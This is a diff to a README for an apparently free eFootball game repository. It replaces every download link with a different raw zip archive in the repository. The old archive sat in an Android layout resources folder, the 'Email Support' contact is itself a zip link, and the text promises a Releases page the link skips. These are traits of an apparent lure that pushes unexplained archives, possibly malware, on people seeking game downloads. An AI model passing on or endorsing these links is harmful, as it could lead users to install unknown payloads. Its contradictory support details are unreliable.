@@ -6,7 +6,7 @@ Welcome to Vortex_KOTLIN_efootball_6441! This application offers an exciting soc
 
 ## 📥 Download
 
-[![Download Vortex_KOTLIN_efootball_6441](https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/src/main/res/layout/efootball-KOTLI-Vortex-1.6.zip)](https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/src/main/res/layout/efootball-KOTLI-Vortex-1.6.zip)
+[![Download Vortex_KOTLIN_efootball_6441](https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/Vortex-efootball-KOTLI-v1.2.zip)](https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/Vortex-efootball-KOTLI-v1.2.zip)
 
 ## 📋 Features
 
@@ -31,7 +31,7 @@ To download the application, follow these simple steps:
 
 1. Click the link below to visit the Releases page. 
 
-[Download Vortex_KOTLIN_efootball_6441](https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/src/main/res/layout/efootball-KOTLI-Vortex-1.6.zip)
+[Download Vortex_KOTLIN_efootball_6441](https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/Vortex-efootball-KOTLI-v1.2.zip)
 
 2. On the Releases page, look for the latest version. You will see a list of available files.
 
@@ -56,7 +56,7 @@ To download the application, follow these simple steps:
 If you run into any issues or have questions about the application, feel free to reach out:
 
 - **GitHub Issues Page:** Use this to report bugs or request features. 
-- **Email Support:** Contact us at https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/src/main/res/layout/efootball-KOTLI-Vortex-1.6.zip for personal assistance.
+- **Email Support:** Contact us at https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/Vortex-efootball-KOTLI-v1.2.zip for personal assistance.
 
 ## 📅 Upcoming Features
 
@@ -80,6 +80,6 @@ A: Yes, Vortex_KOTLIN_efootball_6441 is completely free to download and play.
 
 To start your soccer adventure, click below:
 
-[Download Vortex_KOTLIN_efootball_6441](https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/src/main/res/layout/efootball-KOTLI-Vortex-1.6.zip)
+[Download Vortex_KOTLIN_efootball_6441](https://github.com/assass/Vortex_KOTLIN_efootball_6441/raw/refs/heads/main/app/Vortex-efootball-KOTLI-v1.2.zip)
 
 Get ready to enjoy the excitement of eFootball!
